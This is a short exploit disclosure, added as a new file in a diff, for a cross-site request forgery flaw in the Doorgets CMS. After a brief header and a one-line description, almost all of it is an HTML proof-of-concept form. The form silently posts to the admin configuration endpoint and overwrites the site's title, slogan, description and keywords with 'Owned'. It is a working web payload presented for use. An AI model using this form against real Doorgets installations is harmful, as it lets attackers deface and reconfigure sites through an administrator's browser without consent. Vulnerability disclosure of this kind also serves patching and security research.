@@ -1,0 +1,29 @@
+# Title: Doorgets CSRF Vulnerability
+# Author: n0pe
+# Software Link: http://www.doorgets.com/
+# Download: http://www.doorgets.com/?sources_cms
+# Tested: BackBox Linux 3
+
+With this vulnerability you can change the configuration of the site.
+
+
+Proof of concept:
+
+<html>
+	<body>
+		<form name="csrf" method="post" action="http://localhost/door/admin/?r=config&siteweb">
+			Title <input type="text" id="website_title" name="website_title" value="Owned"><br />
+			Slogan <input type="text" id="website_slogan" name="website_slogan" value="Owned"><br />
+			Description <input type="text" id="website_description" name="website_description" value="Owned"><br />
+			Copyright <input type="text" id="website_copyright" name="website_copyright" value="lol"><br />
+			Year of creation <input  type="text" id="website_year" name="website_year" value="2013"><br />
+			Keywords <input type="text" id="website_keywords" name="website_keywords" value="Owned"><br />
+			ID Facebook <input type="text" id="website_id_facebook" name="website_id_facebook" value=""> <br />
+			Disqus <input  type="text" id="website_id_disqus" name="website_id_disqus" value=""> <br />
+			<input type="radio" name="website_theme"  id="website_theme_doorgets-home"  value="doorgets-home" doorgets-light >doorgets-home<br />                                    
+			<input type="radio" name="website_theme"  id="website_theme_doorgets-light"  value="doorgets-light" checked="checked" >doorgets-light<br />          
+			<input type="submit" id="website_submit" name="website_submit" value="Save">
+		</form>
+	</body>
+</html>
+
